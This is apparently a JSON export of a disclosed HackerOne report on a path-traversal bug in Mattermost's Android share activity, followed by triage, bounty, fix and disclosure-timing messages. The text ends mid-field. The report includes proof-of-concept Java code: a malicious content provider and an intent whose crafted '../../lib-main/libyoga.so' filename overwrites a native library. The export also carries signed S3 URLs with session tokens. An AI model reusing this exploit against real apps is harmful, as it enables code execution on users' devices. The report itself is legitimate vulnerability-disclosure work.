@@ -1,0 +1,401 @@
+{
+  "id": 1115864,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTE1ODY0",
+  "url": "https://hackerone.com/reports/1115864",
+  "title": "Persistant Arbitrary code execution in mattermost android",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-03T15:12:39.699Z",
+  "submitted_at": "2021-03-03T15:12:39.784Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hulkvision_",
+    "url": "/hulkvision_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/PeXPbrzd2LRp46eQmaUCbxd3/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35268,
+    "url": "https://hackerone.com/mattermost",
+    "handle": "mattermost",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Mattermost",
+      "twitter_handle": "Mattermost",
+      "website": "https://mattermost.com",
+      "about": "Open-source collaboration, self-managed or SaaS"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-06-03T10:40:12.940Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-04T10:40:09.705Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nActivity `com.mattermost.share.ShareActivity` is is exported and is designed to allow file sharing from third party application to mattermost android app.\n```\n <activity android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:name=\"com.mattermost.share.ShareActivity\" android:taskAffinity=\"com.mattermost.share\" android:launchMode=\"singleInstance\" android:screenOrientation=\"portrait\" android:configChanges=\"keyboard|keyboardHidden|orientation|screenSize\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.SEND\"/>\n                <action android:name=\"android.intent.action.SEND_MULTIPLE\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <data android:mimeType=\"*/*\"/>\n            </intent-filter>\n        </activity>\n```\nI have found path tansversal vulnerability at `com.mattermost.share.RealPathUtil.java`  file \n```\npublic static String getPathFromSavingTempFile(Context context, final Uri uri) {\n             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here \n            returnCursor.moveToFirst();\n            fileName = returnCursor.getString(nameIndex); // \"filename=../../lib-main/libyoga.so\"\n        } catch (Exception e) {\n            // just continue to get the filename with the last segment of the path\n       }\n             String mimeType = getMimeType(uri.getPath());\n            tmpFile = new File(cacheDir, fileName);\n            tmpFile.createNewFile();  //path transversal here\n            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, \"r\"); \n            //.../\n```\nIt receives  the value of _display_name from the provider and saved the file with this name, leading to path-traversal.\n## Steps To Reproduce:\n  1. Install the POC app and open it. F1216351\n\n  On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and  to create a modified version of `libyoga.so`\n\n### POC \nIn `MainActivity.java`\n```\n        Intent intent = new Intent(Intent.ACTION_SEND);\n        intent.setClassName(\"com.mattermost.rn\", \"com.mattermost.share.ShareActivity\");\n        intent.putExtra(\"android.intent.extra.STREAM\",Uri.parse(\"content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so\"));\n        intent.setType(\"application/*\");\n        startActivity(intent);\n\n```\nIn `EvilContentProvider.java`\n```\npublic Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {\n    MatrixCursor matrixCursor = new MatrixCursor(new String[]{\"_display_name\"});\n    matrixCursor.addRow(new Object[]{uri.getQueryParameter(\"name\")});\n    return matrixCursor;\n}\n\npublic ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {\n    return ParcelFileDescriptor.open(new File(uri.getQueryParameter(\"path\")), ParcelFileDescriptor.MODE_READ_ONLY);\n}\n```\nIn `AndroidManifest.xml`\n```\n<provider android:name=\".EvilContentProvider\" android:authorities=\"com.example.android.pocok\" android:enabled=\"true\" android:exported=\"true\" />\n```\n\n## Impact\n\nAttacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1216351,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z3s803kfwvel2cob25aboq7hb8iz?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fvnd.android.package-archive&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071234Z&X-Amz-Expires=3486&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0d18f6a11305a65962b92a91bb155d0156298ef8d7e019de11886dcb8479b5f7",
+      "file_size": 2525861,
+      "type": "application/vnd.android.package-archive",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-06-03T10:40:09.778Z",
+  "allow_singular_disclosure_after": -72736344.25033006,
+  "singular_disclosure_allowed": true,
+  "vote_count": 63,
+  "voters": [
+    "osman1337",
+    "holyfield",
+    "hulkvision_",
+    "run_win",
+    "tess",
+    "imranhudaa",
+    "tomtenisse",
+    "qtros",
+    "apapedulimu",
+    "anupamas01",
+    "and 53 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 17024,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "mattermost/mattermost-mobile",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 10867510,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2021-03-03T15:48:48.152Z",
+      "updated_at": "2021-03-03T15:48:48.152Z",
+      "additional_data": {
+        "old_severity": "Critical",
+        "new_severity": "High (7.8)",
+        "old_severity_id": 1000828,
+        "new_severity_id": 1001053
+      },
+      "actor": {
+        "username": "juho_nurminen",
+        "cleared": false,
+        "verified": false,
+        "url": "/juho_nurminen",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vdqpo5dx7bqsmygri8l3d7i3tan5/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22JUHO%20-%20Atreides_600x600.png%22%3B%20filename%2A%3DUTF-8%27%27JUHO%2520-%2520Atreides_600x600.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071234Z&X-Amz-Expires=3486&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07fbec30a4c9165c8da7fd8450a01f528fc50664862b3d3067d18525e9eddbe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 10867563,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi @hulkvision_,\n\nThanks for a solid report. I've confirmed the issue and will forward the details to our dev team.\n\nAs it stands, this looks like a local privilege escalation attack: a malicious application already installed on the device can write files in the Mattermost app's search path. I'm basing the CVSS rating on that, but if you're able to demonstrate a remote attack vector, I'd be happy to update it. In either case this is at least a high severity issue.\n\nMy understanding is that fixing the path traversal issue will mitigate this vulnerability in its entirety. Is that correct, or are there any additional mitigations you'd suggest including?\n\nRegards,\n\nJuho Nurminen",
+      "automated_response": false,
+      "created_at": "2021-03-03T15:53:25.442Z",
+      "updated_at": "2021-03-03T15:53:25.442Z",
+      "actor": {
+        "username": "juho_nurminen",
+        "cleared": false,
+        "verified": false,
+        "url": "/juho_nurminen",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vdqpo5dx7bqsmygri8l3d7i3tan5/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22JUHO%20-%20Atreides_600x600.png%22%3B%20filename%2A%3DUTF-8%27%27JUHO%2520-%2520Atreides_600x600.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071234Z&X-Amz-Expires=3486&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07fbec30a4c9165c8da7fd8450a01f528fc50664862b3d3067d18525e9eddbe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 10869192,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I tried to escalate this to remote attack vector but the server santize the filename while uploading file so remote code execution not possible in this case. Yeah fixing the path transversal issue will mitigate this vulnerability.",
+      "automated_response": false,
+      "created_at": "2021-03-03T16:42:45.468Z",
+      "updated_at": "2021-03-03T16:42:45.468Z",
+      "actor": {
+        "username": "hulkvision_",
+        "cleared": false,
+        "verified": false,
+        "url": "/hulkvision_",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PeXPbrzd2LRp46eQmaUCbxd3/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 10886909,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thank you for reporting this vulnerability. After internally reviewing your finding, we have determined that it is a valid issue. We appreciate you bringing this to our attention. Congratulations!! We look forward to more additional reports from you. \n\nBest regards and happy hunting!\n",
+      "automated_response": false,
+      "created_at": "2021-03-05T07:22:11.273Z",
+      "updated_at": "2021-03-05T07:22:11.273Z",
+      "actor": {
+        "url": "/mattermost",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Mattermost"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "mattermost",
+      "collaborator": {
+        "username": "hulkvision_",
+        "url": "/hulkvision_"
+      }
+    },
+    {
+      "id": 10886912,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::SwagAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-05T07:22:27.019Z",
+      "updated_at": "2021-03-05T07:22:27.019Z",
+      "actor": {
+        "url": "/mattermost",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Mattermost"
+        }
+      },
+      "reporter": {
+        "username": "hulkvision_",
+        "url": "/hulkvision_"
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 10994606,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @hulkvision_,\n\nThanks again for reporting this issue. We've prepared a fix and it should be available in version 1.41 of the app, due to be released tomorrow.\n\nRegards,\n\nJuho Nurminen",
+      "automated_response": false,
+      "created_at": "2021-03-15T10:35:28.527Z",
+      "updated_at": "2021-03-15T10:35:28.527Z",
+      "actor": {
+        "username": "juho_nurminen",
+        "cleared": false,
+        "verified": false,
+        "url": "/juho_nurminen",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vdqpo5dx7bqsmygri8l3d7i3tan5/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22JUHO%20-%20Atreides_600x600.png%22%3B%20filename%2A%3DUTF-8%27%27JUHO%2520-%2520Atreides_600x600.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071234Z&X-Amz-Expires=3486&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07fbec30a4c9165c8da7fd8450a01f528fc50664862b3d3067d18525e9eddbe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "hulkvision_",
+        "url": "/hulkvision_"
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 11038029,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-18T05:26:05.399Z",
+      "updated_at": "2021-03-18T05:26:05.399Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "hulkvision_",
+        "cleared": false,
+        "verified": false,
+        "url": "/hulkvision_",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PeXPbrzd2LRp46eQmaUCbxd3/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "mattermost"
+    },
+    {
+      "id": 11120663,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CancelledDisclosureRequest",
+      "message": "Hi @hulkvision_,\n\nI'm canceling your disclosure request for now because we feel 30 days is slightly too soon for this one. While most end-users get automatic updates and that's quick, the application is also open source and has been forked by a few different organizations. To allow those organizations time to roll out updates to their forks, we'd like to give them another 30 days before the details are made public -- so 60 days in total.\n\nRegards,\n\nJuho Nurminen",
+      "automated_response": false,
+      "created_at": "2021-03-25T15:39:05.383Z",
+      "updated_at": "2021-03-25T15:39:05.383Z",
+      "actor": {
+        "username": "juho_nurminen",
+        "cleared": false,
+        "verified": false,
+        "url": "/juho_nurminen",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vdqpo5dx7bqsmygri8l3d7i3tan5/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22JUHO%20-%20Atreides_600x600.png%22%3B%20filename%2A%3DUTF-8%27%27JUHO%2520-%2520Atreides_600x600.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071234Z&X-Amz-Expires=3486&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRN